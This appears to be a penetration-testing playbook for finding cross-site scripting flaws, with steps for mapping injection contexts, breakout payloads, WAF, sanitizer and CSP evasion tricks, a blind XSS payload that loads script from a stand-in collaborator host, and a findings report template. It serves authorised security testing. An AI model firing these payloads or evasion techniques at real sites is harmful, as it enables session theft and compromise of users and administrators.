---
name: reviewing-xss-attack-vectors
description: >-
  Comprehensive multi-context detection for Cross-Site Scripting (XSS) vulnerabilities.
  Evaluates Reflected, Stored, DOM-based, Mutation (mXSS), and Blind XSS across various
  injection contexts including HTML bodies, attributes, JavaScript literals, CSS, and URLs.
domain: cybersecurity
subdomain: web-application-security
tags: [xss, client-side, web-vulnerability, penetration-testing]
mitre_attack: [T1059.007, T1189]
version: "1.0"
author: Victor
license: Apache-2.0
---

# Reviewing Cross-Site Scripting Attack Vectors

## When to Use

- When user-supplied input is reflected in HTTP response bodies, such as in search results, profile pages, or error messages.
- When client-side JavaScript reads data from controllable sinks (`location.hash`, `document.referrer`, `postMessage`) and writes it to the DOM.
- When evaluating complex input fields designed to store markup (e.g., Markdown editors, rich text comments).
- When HTTP response headers indicate missing or weak Content-Security-Policy (CSP) headers (e.g., containing `unsafe-inline`).

**Do not use** destructive payloads that degrade the user experience for legitimate users in production (e.g., persistent pop-ups or infinite redirects) or steal session cookies of actual users.

## Prerequisites

- Interception proxy (Burp Suite, ZAP) or a browser with Developer Tools.
- Safe, non-intrusive probe strings (e.g., `xPrObE9k2`).
- An Out-of-Band (OOB) listener for Blind XSS testing (e.g., XSS Hunter, Burp Collaborator).
- An isolated browser profile or Incognito window to safely execute payloads without contaminating your primary session.

## Workflow

### Step 1: Probe Injection and Context Mapping
1. Send a unique alphanumeric probe string (e.g., `xPrObE9k2`) into all available input vectors (query parameters, JSON bodies, headers, URL fragments).
2. Inspect the HTTP response and use `grep` (or browser search) to locate where the probe string is reflected.
3. Determine the **Injection Context** for each reflection:
   - **HTML Content Context**: `<div>xPrObE9k2</div>`
   - **HTML Attribute Context**: `<input value="xPrObE9k2">` (note the quote type: double, single, or none).
   - **JavaScript Context**: `var x = "xPrObE9k2";` inside a `<script>` block.
   - **URL Context**: `<a href="xPrObE9k2">`

### Step 2: Context Escape and Payload Injection
Select the appropriate payload to escape the identified context:

- **HTML Content**: Try injecting a new element: `<svg onload=console.log(1)>`
- **HTML Attribute (Double Quoted)**: Break out of the attribute and inject an event handler: `" autofocus onfocus="console.log(1)`
- **JavaScript String**: Break out of the string literal and execute an expression: `";console.log(1);//`
- **URL Context**: Inject a pseudo-protocol: `javascript:console.log(1)`

### Step 3: Evading Defenses (WAF / Sanitizers / CSP)
If the payload is blocked or sanitized, analyze the defense mechanism:
- **WAF Blocks**: If `<script>` is blocked, try HTML entities (`&#x6f;nerror`), casing variations (`sCrIpt`), or rare event handlers (`onpointerover`).
- **Sanitizers (e.g., DOMPurify)**: If standard tags are stripped but safe HTML is allowed, test for Mutation XSS (mXSS) by using nested structures like `<noscript><p title="</noscript><img src=x onerror=...>">`.
- **Content-Security-Policy (CSP)**:
  - If `unsafe-inline` is blocked, you cannot use `<svg onload>`. 
  - Look for loaded libraries with known gadget chains (e.g., AngularJS template injection).
  - Look for JSONP endpoints or open redirects on the same origin that can bypass `script-src 'self'`.

### Step 4: Verification and Proof of Concept
To confirm the vulnerability, you **must** achieve execution in a browser.
1. Render the payload in an isolated browser environment.
2. Verify execution by observing `console.log(1)` output in the Developer Tools Console, or by proving the DOM has been fundamentally altered.
3. For Stored XSS, ensure you can clean up (delete) the payload after execution.

### Verification Phase
1. Establish baseline network responses and determine parameter contexts.
2. Inject specialized payloads specifically targeted at evaluating Reviewing Cross-Site Scripting Attack Vectors.
3. Analyze HTTP response headers, status codes, and out-of-band signals.

```bash
# Verify endpoint response behavior under inspection payload
curl -i -s -k -X POST "https://target.example.com/api/v1/inspect" \
     -H "Content-Type: application/json" \
     -d '{"parameter": "test_payload"}'
```

## Key Concepts

| Term | Definition |
|------|------------|
| **DOM-based XSS** | XSS that occurs entirely on the client-side. The server response does not contain the payload; rather, frontend JavaScript insecurely handles client-side input (like `location.hash`). |
| **Blind XSS** | A variant of Stored XSS where the payload is executed in an environment the attacker cannot see, such as a backend administrative dashboard or customer support portal. |
| **mXSS (Mutation XSS)** | XSS triggered by browser rendering engines mutating seemingly safe HTML (often after it passes a sanitizer) into executable, unsafe HTML during the `innerHTML` serialization-parsing cycle. |

## Tools & Systems

- Burp Suite Professional / Community Edition
- Standard web browsers and interception proxies.

## Common Scenarios

### Scenario: False Positive - HTML Encoding
**Context**: You inject `<script>alert(1)</script>` into a search field. The response contains `&lt;script&gt;alert(1)&lt;/script&gt;`.
**Analysis**: The application has correctly performed HTML entity encoding, neutralizing the payload for the HTML Content context.
**Action**: Determine if the same payload is reflected in an unencoded attribute or JavaScript context where HTML entity encoding is insufficient to prevent execution.

### Scenario: False Negative - DOM Sink Ignored
**Context**: You inject a payload into the URL fragment (`#payload`), but the server response remains completely unchanged.
**Analysis**: URL fragments (`#`) are not sent to the server. The lack of server-side reflection does not mean it's secure.
**Action**: Open the browser Developer Tools. Inspect the client-side JavaScript to see if it reads `window.location.hash` and writes it to an unsafe sink like `document.getElementById('x').innerHTML`.

### Scenario: Blind XSS via Feedback Forms
**Context**: An application features a "Contact Us" form that submits data to the server but never displays it back to the user.
**Analysis**: The data is likely viewed by an administrator in a separate, internal web application.
**Action**: Inject an OOB payload (e.g., `<script src="https://your-collaborator.net/xss.js"></script>`). If the internal admin panel lacks sanitization, the payload will fire when the administrator opens the message, sending an HTTP request to your listener.

## Output Format

Document confirmed XSS vulnerabilities with execution context evidence:

```json
{
  "id": "xss-001",
  "title": "Reflected XSS in search parameter",
  "severity": "high",
  "cwe": "CWE-79",
  "parameter": "q (Query String)",
  "context": "HTML Attribute (Double Quoted)",
  "status": "confirmed",
  "evidence": {
    "payload": "\"><svg onload=console.log('XSS_CONFIRMED')>",
    "response_snippet": "<input type=\"text\" name=\"q\" value=\"\"><svg onload=console.log('XSS_CONFIRMED')>\">",
    "execution_proof": "Payload executes in Chrome DevTools Console, printing 'XSS_CONFIRMED'."
  },
  "description": "The 'q' parameter is reflected inside a double-quoted HTML attribute without proper escaping, allowing arbitrary JavaScript execution."
}
```
